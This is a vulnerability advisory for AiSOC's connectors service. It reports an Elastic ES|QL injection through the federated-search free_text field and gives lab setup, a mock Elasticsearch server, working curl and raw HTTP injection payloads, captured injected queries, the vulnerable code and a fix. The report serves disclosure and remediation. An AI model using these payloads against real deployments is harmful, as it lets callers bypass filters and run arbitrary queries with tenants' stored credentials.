### Vulnerability details

**Official website / Product:** https://github.com/beenuar/AiSOC

**Repository:** beenuar/AiSOC (stars at selection: 6096)

**Vulnerability type:** SQLi (Elastic ES|QL injection via federated-search free_text)

**Vulnerability versions:** 21.0.0 (audited commit `58f42c724de9ec8fca646945e4a3677af39f27e3`); reproduced on `ghcr.io/beenuar/aisoc-connectors:latest`

**Vulnerability URL / Parameter:** `POST /api/v1/connectors/elastic/query` JSON field `query.free_text` (also reached via API `POST /api/v1/federated/search` → same translator)

**Complex:** yes

### Verification procedure

Lab topology (original `labs/aisoc-r21a8/` was torn down per hygiene; compose / mock below match verification time and can rebuild the lab):

- Port: host **127.0.0.1:20108** → connectors container **8003**
- Compose: minimal `docker-compose.yml` (connectors + mock-es), see step 3 below
- Image: `ghcr.io/beenuar/aisoc-connectors:latest` (verified lab also bind-mounted audited `services/connectors/app` @ `58f42c7`; the published image already contained this sink, so omitting the volume still reproduces)
- Mock ES: `python:3.11-slim` running `lab-poc/mock_es.py` below (in-container `:9200`)
- Auth: `AISOC_SERVICE_TOKEN=r21a8-lab-service-token` + header `X-AiSOC-Tenant-ID: 11111111-1111-1111-1111-111111111111`
- Proxy cleared inside connectors (`http_proxy`/`https_proxy`/… empty, `NO_PROXY=*`) so SIEM traffic to mock-es is direct

1. Prepare the lab directory (clone the audited commit for the bind-mount; if using the published image alone, skip checkout and drop the connectors `volumes:` bind-mount line):

```bash
mkdir -p labs && git clone https://github.com/beenuar/AiSOC.git labs/aisoc-r21a8
cd labs/aisoc-r21a8
git checkout 58f42c724de9ec8fca646945e4a3677af39f27e3
mkdir -p lab-poc
# Move the huge upstream compose aside, then write the minimal compose below
mv docker-compose.yml docker-compose.upstream.yml 2>/dev/null || true
```

2. Write `lab-poc/mock_es.py` (records ES|QL bodies posted to `/_query` and returns a connectors-parseable columns/values shape):

```python
#!/usr/bin/env python3
"""Minimal Elasticsearch stand-in that records ES|QL /_query bodies."""
from __future__ import annotations

import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

LOG = Path("/tmp/esql-queries.jsonl")


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:  # quieter
        print("[mock-es]", fmt % args, flush=True)

    def _json(self, code: int, payload: dict) -> None:
        body = json.dumps(payload).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:  # noqa: N802
        if self.path in ("/", ""):
            self._json(
                200,
                {
                    "name": "mock-es",
                    "cluster_name": "aisoc-lab",
                    "version": {"number": "8.15.0"},
                    "tagline": "You Know, for Search",
                },
            )
            return
        self._json(404, {"error": "not found", "path": self.path})

    def do_POST(self) -> None:  # noqa: N802
        length = int(self.headers.get("Content-Length", "0") or 0)
        raw = self.rfile.read(length) if length else b"{}"
        try:
            data = json.loads(raw.decode() or "{}")
        except json.JSONDecodeError:
            data = {"_raw": raw.decode(errors="replace")}
        record = {
            "path": self.path,
            "authorization": self.headers.get("Authorization"),
            "body": data,
        }
        with LOG.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, ensure_ascii=False) + "\n")
        print("[mock-es] captured query:", json.dumps(data, ensure_ascii=False), flush=True)
        # ES|QL response shape expected by ElasticConnector._rows_from_esql
        self._json(
            200,
            {
                "columns": [
                    {"name": "@timestamp", "type": "date"},
                    {"name": "message", "type": "keyword"},
                    {"name": "host.name", "type": "keyword"},
                ],
                "values": [
                    ["2026-11-01T00:00:00.000Z", "injected-proof-row", "WIN-LAB-01"],
                ],
            },
        )


if __name__ == "__main__":
    LOG.write_text("", encoding="utf-8")
    server = ThreadingHTTPServer(("0.0.0.0", 9200), Handler)
    print("mock-es listening on :9200", flush=True)
    server.serve_forever()
```

3. Write the minimal `docker-compose.yml` and start:

```yaml
# Minimal lab for AiSOC federated ES|QL free_text injection (r21-a8)
# Host port 20108 -> connectors :8003
name: aisoc-r21a8

services:
  mock-es:
    image: python:3.11-slim
    command: ["python", "/app/mock_es.py"]
    volumes:
      - ./lab-poc/mock_es.py:/app/mock_es.py:ro
      - mock-es-log:/tmp
    expose:
      - "9200"
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://127.0.0.1:9200/')"]
      interval: 3s
      timeout: 3s
      retries: 20

  connectors:
    # Published image still contains the free_text ES|QL injection; bind-mount
    # matches audited commit 58f42c7.
    image: ghcr.io/beenuar/aisoc-connectors:latest
    volumes:
      - ./services/connectors/app:/app/app:ro
    environment:
      PORT: "8003"
      AISOC_SERVICE_TOKEN: "r21a8-lab-service-token"
      AISOC_DEV_MODE: "0"
      AISOC_DEV_AUTH_BYPASS: "0"
      http_proxy: ""
      https_proxy: ""
      HTTP_PROXY: ""
      HTTPS_PROXY: ""
      ALL_PROXY: ""
      all_proxy: ""
      NO_PROXY: "*"
      no_proxy: "*"
    ports:
      - "127.0.0.1:20108:8003"
    depends_on:
      mock-es:
        condition: service_healthy

volumes:
  mock-es-log:
```

```bash
docker compose up -d
docker compose ps
# Expected example:
# aisoc-r21a8-connectors-1   ghcr.io/beenuar/aisoc-connectors:latest   Up   127.0.0.1:20108->8003/tcp
# aisoc-r21a8-mock-es-1      python:3.11-slim                          Up (healthy)   9200/tcp
```

4. Control case (`free_text=malware`) should only produce `LIKE "%malware%"`:

```bash
curl -sS -X POST 'http://127.0.0.1:20108/api/v1/connectors/elastic/query' \
  -H 'Authorization: Bearer r21a8-lab-service-token' \
  -H 'X-AiSOC-Tenant-ID: 11111111-1111-1111-1111-111111111111' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data-binary '{"auth_config":{"api_key":"lab-api-key"},"connector_config":{"base_url":"http://mock-es:9200","index":"logs-*","ssl_verify":false},"query":{"free_text":"malware","since_seconds":3600,"limit":10}}'
```

5. Send the injection payload (full raw HTTP below; equivalent curl):

```bash
curl -sS -D - -X POST 'http://127.0.0.1:20108/api/v1/connectors/elastic/query' \
  -H 'Authorization: Bearer r21a8-lab-service-token' \
  -H 'X-AiSOC-Tenant-ID: 11111111-1111-1111-1111-111111111111' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data-binary '{"auth_config":{"api_key":"lab-api-key"},"connector_config":{"base_url":"http://mock-es:9200","index":"logs-*","ssl_verify":false},"query":{"free_text":"%\" | WHERE true OR message LIKE \"%","since_seconds":3600,"limit":10}}'
```

6. Confirm the injected ES|QL on the mock-es side:

```bash
docker exec aisoc-r21a8-mock-es-1 cat /tmp/esql-queries.jsonl
# Injected line should contain: WHERE message LIKE "%%" | WHERE true OR message LIKE "%%"
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /api/v1/connectors/elastic/query HTTP/1.1
Host: 127.0.0.1:20108
Authorization: Bearer r21a8-lab-service-token
X-AiSOC-Tenant-ID: 11111111-1111-1111-1111-111111111111
Content-Type: application/json
Accept: application/json
Content-Length: 224
Connection: close

{"auth_config":{"api_key":"lab-api-key"},"connector_config":{"base_url":"http://mock-es:9200","index":"logs-*","ssl_verify":false},"query":{"free_text":"%\" | WHERE true OR message LIKE \"%","since_seconds":3600,"limit":10}}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
date: Sun, 01 Nov 2026 19:52:22 GMT
server: uvicorn
content-length: 147
content-type: application/json
vary: Origin
connection: close

{"connector_id":"elastic","row_count":1,"rows":[{"@timestamp":"2026-11-01T00:00:00.000Z","message":"injected-proof-row","host.name":"WIN-LAB-01"}]}
```

Verification result notes:

- HTTP 200; connectors interpolates attacker-controlled `free_text` into ES|QL and posts it to Elasticsearch `/_query`.
- mock-es recorded: `WHERE message LIKE "%%" | WHERE true OR message LIKE "%%"` — quote breakout and pipeline injection (filter bypass) succeeded. Example capture from `docker exec aisoc-r21a8-mock-es-1 cat /tmp/esql-queries.jsonl`:

```json
{
  "path": "/_query",
  "authorization": "ApiKey lab-api-key",
  "body": {
    "query": "FROM logs-*\n| WHERE @timestamp > NOW() - 3600 seconds\n| WHERE message LIKE \"%%\" | WHERE true OR message LIKE \"%%\"\n| LIMIT 10"
  }
}
```

- The same sink also accepts `| STATS count() BY host.name |`, enabling unexpected aggregation against the customer's Elastic cluster. With `free_text` set to `a%" | STATS count() BY host.name | WHERE message LIKE "%"`, mock-es captured:

```json
{
  "path": "/_query",
  "authorization": "ApiKey lab-api-key",
  "body": {
    "query": "FROM logs-*\n| WHERE @timestamp > NOW() - 3600 seconds\n| WHERE message LIKE \"%a%\" | STATS count() BY host.name | WHERE message LIKE \"%%\"\n| LIMIT 10"
  }
}
```

### Vulnerability analysis

Federated search translates a `UnifiedQuery` into Elastic ES|QL. `_indicator_to_esql()` correctly escapes indicator values with `_esql_quote()` (comments document that raw interpolation previously allowed quote breakout). `to_esql()` still builds `free_text` as:

`f'| WHERE message LIKE "%{query.free_text}%"'`

An authenticated caller who can use federated search can place `"` in `free_text`, terminate the LIKE string early, and append arbitrary ES|QL pipeline stages (extra WHERE / STATS / SORT, …) that execute with the tenant's stored Elastic credentials. This is not intentional LLM/agent triage RCE.

Trigger / sink source (full path and line numbers):

```python
# File: services/connectors/app/federated/translators/esql.py
# Lines: 23-77
def _esql_quote(value: Any) -> str:
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, int | float):
        return str(value)
    text = str(value)
    escaped = text.replace("\\", "\\\\").replace('"', '\\"')
    return f'"{escaped}"'


def _indicator_to_esql(indicator: Indicator) -> str:
    field_token = indicator.field
    op = indicator.operator
    value = indicator.value

    if op == "eq":
        return f"{field_token} == {_esql_quote(value)}"
    if op == "ne":
        return f"{field_token} != {_esql_quote(value)}"
    # ES|QL has no native CONTAINS; LIKE with %...% is the canonical port. The
    # pattern goes through the same quoting as every other value. It used to be
    # interpolated raw, which left a double quote in the value able to close
    # the literal and append clauses of its own.
    if op == "contains":
        return f"{field_token} LIKE {_esql_quote(f'%{value}%')}"
    if op == "starts_with":
        return f"{field_token} LIKE {_esql_quote(f'{value}%')}"
    if op == "ends_with":
        return f"{field_token} LIKE {_esql_quote(f'%{value}')}"
    if op == "gt":
        return f"{field_token} > {_esql_quote(value)}"
    if op == "gte":
        return f"{field_token} >= {_esql_quote(value)}"
    if op == "lt":
        return f"{field_token} < {_esql_quote(value)}"
    if op == "lte":
        return f"{field_token} <= {_esql_quote(value)}"
    if op == "in":
        joined = ", ".join(_esql_quote(v) for v in value)
        return f"{field_token} IN ({joined})"
    raise QueryError(f"unsupported operator for ES|QL: {op}")


def to_esql(query: UnifiedQuery, *, index: str = "logs-*") -> str:
    """Render a ``UnifiedQuery`` as an ES|QL pipeline."""
    lines: list[str] = [
        f"FROM {index}",
        f"| WHERE @timestamp > NOW() - {query.since_seconds} seconds",
    ]
    if query.free_text:
        lines.append(f'| WHERE message LIKE "%{query.free_text}%"')
    for indicator in query.indicators:
        lines.append(f"| WHERE {_indicator_to_esql(indicator)}")
    lines.append(f"| LIMIT {query.limit}")
    return "\n".join(lines)
```

Call chain: `POST /api/v1/connectors/elastic/query` → `parse_unified_query` → `ElasticConnector.query` → `to_esql` → `POST {base_url}/_query`.

### Fix notes

Route `free_text` through `_esql_quote()` the same way indicator values are handled, e.g.

`lines.append(f"| WHERE message LIKE {_esql_quote('%' + query.free_text + '%')}")`

Add a regression test asserting that free_text containing `"`, `\\`, or `|` cannot alter pipeline structure.
